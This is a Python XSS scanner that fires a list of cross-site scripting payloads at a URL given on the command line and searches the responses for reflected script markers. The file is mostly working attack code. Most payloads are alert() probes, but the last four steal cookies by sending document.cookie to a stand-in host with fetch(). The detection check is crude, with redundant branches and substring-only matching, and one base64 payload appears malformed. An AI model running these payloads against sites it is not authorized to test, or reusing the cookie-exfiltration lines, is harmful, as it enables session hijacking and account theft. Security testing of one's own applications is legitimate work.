import requests

def check_xss(url, payloads):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    vulnerable = False
    for payload in payloads:
        test_url = f"{url}?q={payload}"
        try:
            response = requests.get(test_url, headers=headers)
            response_text = response.text

            # Check for common XSS patterns in the response
            if any(x in response_text for x in ['alert(', 'console.log(', 'onerror=', 'onload=', 'javascript:', 'eval(', '<script>', '<img', '<svg', '<iframe', '<object', '<embed', '<meta', 'document.write', 'srcdoc']):
                # More precise checks
                if '<script>' in response_text or 'alert(' in response_text or 'console.log(' in response_text:
                    print(f"Possible XSS with payload: {payload}")
                    vulnerable = True
                elif 'onerror=' in response_text or 'onload=' in response_text or 'javascript:' in response_text:
                    # Check for inline JavaScript and event handlers
                    if 'onerror=' in response_text or 'onload=' in response_text or 'javascript:' in response_text:
                        print(f"Possible XSS with payload: {payload}")
                        vulnerable = True
                elif 'document.write' in response_text or 'srcdoc' in response_text:
                    # Check for DOM-based XSS
                    print(f"Possible XSS with payload: {payload}")
                    vulnerable = True

        except requests.RequestException as e:
            print(f"Request failed: {e}")
    return vulnerable

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python script.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    payloads = [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "<body onload=alert('xss')>",
        "<svg onload=alert('xss')>",
        "<iframe src=javascript:alert('xss')>",
        "<link rel=stylesheet href=javascript:alert('xss')>",
        "<script src=javascript:alert('xss')></script>",
        "javascript:alert('xss')",
        "<script>document.write('<img src=x onerror=alert(1)>')</script>",
        "<object data=javascript:alert('xss')>",
        "<form><button formaction=javascript:alert('xss')>Click me</button></form>",
        "<input type=text value=\"<img src=x onerror=alert('xss')>\">",
        "<style>@import'javascript:alert(1)';</style>",
        "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
        "<script>eval('alert(1)')</script>",
        "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
        "<script src=data:text/javascript;base64,YWxlcnQoJ3hzcyd9'></script>",
        "<details open ontoggle=alert('xss')>",
        "<marquee onstart=alert('xss')>",
        "<object data=javascript:alert(1)>",
        "<embed src=javascript:alert('xss')>",
        "<svg><script>alert(1)</script></svg>",
        "<a href='javascript:alert(1)'>Click here</a>",
        "<body onload=alert(1)>",
        "<img src='x' onerror=alert(1)>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<input type=text value=''><script>alert(1)</script>",
        "<textarea onfocus=alert(1)>",
        "<script>fetch('https://example.com?cookie=' + document.cookie)</script>",
        "<script>fetch('https://example.com', { method: 'POST', body: document.cookie })</script>",
        "<svg/onload=fetch('https://example.com?cookie=' + document.cookie)>",
        "<iframe srcdoc='<svg/onload=fetch(\\x27https://example.com?cookie=' + document.cookie + '\\x27)>'></iframe>"
    ]
    is_vulnerable = check_xss(url, payloads)
    print(f"Vulnerable to XSS: {is_vulnerable}")
